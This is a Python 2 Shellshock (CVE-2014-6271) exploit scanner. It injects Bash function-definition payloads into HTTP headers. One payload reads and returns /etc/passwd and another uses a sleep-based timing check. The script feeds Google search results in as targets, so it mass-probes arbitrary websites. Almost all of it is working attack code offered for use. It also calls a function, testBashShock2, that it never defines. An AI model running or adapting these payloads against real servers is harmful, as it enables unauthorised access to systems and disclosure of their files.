#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# writted by brock@wooyun

import urllib2
import sys
import getopt
from utils import google
from utils import webutils
import time

resultCount = 20
beginNumber = 0
waitTime = 0.0

EXPLOIT1 = '() { :;};a=`/bin/cat /etc/passwd`;echo $a'
SLEEP_TIME = 7
EXPLOIT2 = '() { :;};sleep %s' % SLEEP_TIME

#env -i  X='() { (a)=>\' bash -c 'echo date'; cat echo
#无漏洞的输出：
#date
#cat: echo: No such file or directory
#
#有漏洞的输出：
#/bin/bash: X: line 1: syntax error near unexpected token `='
#/bin/bash: X: line 1: `'
#/bin/bash: error importing function definition for `X'
#Fri Sep 26 17:07:25     2014

def testBashShock1(url):
	opener = urllib2.build_opener()
	webutils.setupOpener(opener)
	req = urllib2.Request(url)
	req.add_header('Proxy-Connection', 'keep-alive')
	req.add_header('Cache-Control', 'max-age=0')
	req.add_header('X-Test', EXPLOIT1)
	req.add_header('User-Agent', EXPLOIT1)
	req.add_header('Referer',  EXPLOIT1)
	req.add_header('X-Forwarded-For',  EXPLOIT1)
	#print '******* ' + url + ' *******'
	try:
		response = opener.open(req, timeout = 15)
		if response:
			if response.info().getheader('root'):
				print
				print 'PANIC!!!'
				print '******* [URL: %s], [Header: %s] [1]' % (url, 'X-Test')
				print 'root:' + response.info().getheader('root')
				return True
			html = response.read()
			if html.find('root:') != -1:
				print
				print 'PANIC!!!'
				print '******* [URL: %s], [Header: %s] [2]' % (url, 'X-Test')
			 	return True
			#for k, v in response.info().items():
			#	print k + ': ', v
	except Exception, e:
		pass
		#print 'Exception: ', e
	return False

TIMEBASED_TIMEOUT = 15
def testBashShockByTime(url, header):
	opener = urllib2.build_opener()
	webutils.setupOpener(opener)
	req = urllib2.Request(url)
	webutils.setupRequest(req)
	req.add_header('Proxy-Connection', 'keep-alive')
	req.add_header('Cache-Control', 'max-age=0')

	response, t1 = webutils.measureRequest(opener, req, TIMEBASED_TIMEOUT)
	req.add_header(header,  EXPLOIT2)
	response, t2 = webutils.measureRequest(opener, req, TIMEBASED_TIMEOUT)
	if t2 >= SLEEP_TIME and t2 > t1 and t2 < TIMEBASED_TIMEOUT:
		print
		print 'PANIC!!!'
		print '******* [URL: %s] [Header: %s]' % (url, header)
		print
		return True

	"""
	#req.add_header('X-Test', EXPLOIT2)
	#req.add_header('User-Agent', EXPLOIT2)
	#req.add_header('Referer',  EXPLOIT2)

	#print '******* ' + url + ' *******'
	try:
		t1 = time.time()
		response = opener.open(req, timeout = TIMEBASED_TIMEOUT)
		t2 = time.time() - t1
		if t2 >= SLEEP_TIME and t2 < TIMEBASED_TIMEOUT:
			t1 = time.time()
			response = opener.open(req, timeout = TIMEBASED_TIMEOUT)
			t2 = time.time() - t1
			if t2 >= SLEEP_TIME and t2 < TIMEBASED_TIMEOUT:
				print
				print 'PANIC!!!'
				print '******* [URL: %s] [Header: %s]' % (url, header)
				print
				return True
	except Exception, e:
		pass
		# print 'Exception: ', e
	"""
	return False

"""
def testBashShock3(url):
	opener = urllib2.build_opener()
	webutils.setupOpener(opener)
	req = urllib2.Request(url)
	req.add_header('Proxy-Connection', 'keep-alive')
	req.add_header('Cache-Control', 'max-age=0')
	#req.add_header('X-Test', EXPLOIT2)
	#req.add_header('User-Agent', EXPLOIT2)
	req.add_header('Referer',  EXPLOIT2)
	#req.add_header('X-Forwarded-For',  EXPLOIT2)
	#print '******* ' + url + ' *******'
	try:
		t1 = time.time()
		response = opener.open(req, timeout = 30)
		t2 = time.time() - t1
		if t2 >= 12 and t2 < 30:
			print
			print '[shock] PANIC!!!'
			print '******* ' + url
			print
			return True
	except Exception, e:
	   print 'Exception: ', e
	return False
"""

def scan(url, opener):
	if testBashShock1(url):
		return True
	if testBashShockByTime(url, 'Referer'):
		return True
	if testBashShockByTime(url, 'X-Forwarded-For'):
		return True
	if testBashShockByTime(url, 'User-Agent'):
		return True
	return False

if __name__ == '__main__':
	opts, args = getopt.getopt(sys.argv[1:], "n:b:w:u:")
	for op, value in opts:
		if op == '-n':
			resultCount = int(value)
		elif op == '-b':
			beginNumber = int(value)
		elif op == '-u':
			url = value
		elif op == '-w':
			waitTime = int(value)

	opener = urllib2.build_opener()
	webutils.setupOpener(opener)

	if len(url) > 0:
		testBashShock1(url)
		testBashShock2(url)
		sys.exit(0)
	#print resultCount
	#print args[0]
	i = 0
	#import pdb
	#pdb.set_trace()
	for url in google.google(opener, args[0], resultCount, beginNumber):
		i += 1
		testBashShock2(url)
		if waitTime > 0:
			time.sleep(waitTime)

	print i

